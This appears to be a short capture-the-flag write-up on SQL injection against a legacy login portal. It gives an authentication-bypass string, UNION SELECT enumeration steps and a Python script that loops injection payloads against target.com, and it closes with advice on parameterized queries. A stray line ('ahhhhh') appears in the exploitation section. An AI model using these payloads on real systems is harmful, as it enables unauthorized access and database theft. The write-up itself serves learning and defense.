# SQL Injection Masterclass

**Category:** Web Exploitation
**Difficulty:** Medium
**Date:** 2023-11-15

## Challenge Description
The target was a legacy login portal that seemed vulnerable to SQL injection. The goal was to bypass authentication and dump the user database.

## Reconnaissance
I started by fuzzing the login fields. Entering `' OR 1=1 --` in the username field resulted in a successful login as the first user in the database (admin).

## Exploitation
ahhhhh
1.  **Determine column count:** `ORDER BY 3` worked, `ORDER BY 4` failed. So, 3 columns.
2.  **Find vulnerable column:** `UNION SELECT 1, 2, 3` showed '2' on the screen.
3.  **Dump Database:** `UNION SELECT 1, database(), 3` revealed the DB name 'users_db'.

## Code Snippet
Here is the python script I used to automate the blind SQL injection part later on:

```python
import requests

url = "http://target.com/login"
payload = "' OR length(password) > {} --"

for i in range(1, 20):
    r = requests.post(url, data={'username': payload.format(i)})
    if "Welcome" in r.text:
        print(f"Password length is greater than {i}")
```

## Conclusion
Always sanitize your inputs! Using prepared statements (parameterized queries) is the best defense against SQLi.
